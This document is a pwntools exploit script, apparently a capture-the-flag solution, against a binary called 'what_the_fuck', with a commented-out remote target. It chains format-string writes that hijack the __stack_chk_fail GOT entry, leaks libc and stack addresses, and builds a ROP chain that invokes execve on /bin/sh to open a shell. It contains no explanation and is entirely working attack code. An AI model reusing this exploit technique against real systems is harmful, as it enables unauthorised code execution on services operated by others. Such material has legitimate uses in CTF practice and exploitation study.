# encoding: utf-8  
from pwn import *
import struct

elf = ELF('./what_the_fuck')

p = process('./what_the_fuck')
#p = remote('106.75.66.195',10000)

def msg(payload):
    p.recvuntil('leave a msg: ')
    #pause()
    p.send(payload)

###########1 _stack_chk_fail => main########

p.recvuntil('input your name: ')

p.sendline(p64(elf.got['__stack_chk_fail'])) #0x0000000000601020

#_stack_chk_fail => main
# main_addr = 0x400983
# 0x4006c6--> 0x400983

payload = "%"+str(0x983)+'c%12$hn'+'AA%9$s'
payload = payload.ljust(0x18,'a')
payload += p64(elf.got['read']) #read 's really addr
#trigger _stack_chk_fail to ROP 
msg(payload)
p.recvuntil('AA')
read = u64(p.recvuntil('\x7f').ljust(0x8,"\x00"))
log.info('read_addr:'+hex(read))

syscall = read+0xe
log.info('read_syscall:'+hex(syscall))
############2-->leak stack_addr###########
p.recvuntil('input your name: ')
p.sendline('ZoE')

payload = 'A'*10+'%10$ldCC'
payload = payload.ljust(0x20,'B')
msg(payload)
p.recvuntil('A'*10)
stack = int(p.recvuntil('CC',drop=True),10)
log.info('stack_addr:'+hex(stack))

##########change###############

payload=p64(0)
p.recvuntil('input your name: ')
p.send(payload)
p.recvuntil('leave a msg: ')
payload=p64(0x0400A7C)
payload+=p64(0x601040)
payload+=p64(0x200)
payload+=p64(stack-0x88)
pause()
p.send(payload)


payload=p64(stack-0x90)
p.recvuntil('input your name: ')
p.send(payload)
p.recvuntil('leave a msg: ')
payload='%12$n'
payload+='\x00'*(0x20-len(payload))
pause()
p.send(payload)


payload=p64(stack-0x88)
p.recvuntil('input your name: ')
p.send(payload)
p.recvuntil('leave a msg: ')
payload='%9$n'+'%.'+str(0x400a60)+'d'+'%12$n'
payload+='\x00'*(0x18-len(payload))
payload+=p64(stack-0x8c)
pause()
p.send(payload)


rbp=stack-0xb8
rbp=rbp%0x10000
payload=p64(stack-0x1b0)
p.recvuntil('input your name: ')
p.send(payload)
p.recvuntil('leave a msg: ')
payload='%.'+str(rbp)+'d'+'%12$hn'
pause()
p.send(payload)

###### change  from main return __stack_chk_fail ########

payload=p64(0x601020)
p.recvuntil('input your name: ')
p.send(payload)
p.recvuntil('leave a msg: ')
payload='%.'+str(0x0a1c)+'d'+'%12$hn'
payload+='\x00'*(0x20-len(payload))
c2=raw_input("go?")
pause()
p.send(payload)


payload=p64(0x0400A7A)
payload+=p64(0x0)
payload+=p64(0x1)
payload+=p64(0x601040)
payload+=p64(0x3b)
payload+=p64(0x601b00)
payload+=p64(0x0)
payload+=p64(0x400a60)
payload+=p64(0x0)
payload+=p64(0x0)
payload+=p64(0x1)
payload+=p64(0x601b08)
payload+=p64(0x0)
payload+=p64(0x0)
payload+=p64(0x601b00)
payload+=p64(0x400a60)
raw_input("go?")
pause()
p.send(payload)

pause()
p.send('/bin/sh'+'\x00'+p64(syscall)+'\x00'*0x2b)


p.interactive()
